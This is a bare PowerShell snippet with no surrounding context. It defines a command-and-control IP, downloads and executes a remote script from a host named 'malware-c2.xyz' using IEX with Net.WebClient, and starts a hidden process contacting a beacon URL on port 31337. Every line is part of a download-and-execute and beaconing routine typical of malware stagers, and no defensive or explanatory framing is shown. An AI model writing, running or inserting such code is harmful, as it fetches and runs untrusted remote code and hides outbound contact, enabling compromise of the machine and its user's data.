$c2 = "185.220.101.2"
IEX (New-Object Net.WebClient).DownloadString("http://malware-c2.xyz/payload.ps1")
Start-Process -WindowStyle Hidden "http://45.33.32.156:31337/beacon"
